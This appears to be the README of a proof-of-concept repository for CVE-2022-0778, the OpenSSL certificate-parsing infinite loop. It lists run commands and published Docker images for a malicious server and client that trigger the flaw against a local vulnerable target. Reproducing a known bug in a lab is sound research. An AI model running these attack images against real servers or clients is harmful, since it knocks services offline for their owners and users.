# cve-2022-0778

## bad server

```
go run server/main.go --addr 127.0.0.1:12345

cd test && test_server.sh

docker stat
```

## bad client

```
cd test && test_client.sh

go run client/main.go  --network tcp --addr 127.0.0.1:12345

docker stat
```

## build

```
docker build -t cve-2022-0778 .
```

## docker hub

```
# start vulned server
docker pull yywing/cve-2022-0778-target
docker run -it --rm -p 12345:12345 yywing/cve-2022-0778-target python server.py
# attack
docker pull yywing/cve-2022-0778
docker run -it --rm --entrypoint badclient yywing/cve-2022-0778 --addr host.docker.internal:12345

# start bad server
docker run -it --rm -p 12345:12345 yywing/cve-2022-0778 --addr 0.0.0.0:12345
# use vulned client
docker run -it --rm yywing/cve-2022-0778-target python -c "import http.client;http.client.HTTPSConnection('host.docker.internal', 12345).request('GET', '/')"
# or
docker run -it --rm yywing/cve-2022-0778-target curl https://host.docker.internal:12345
```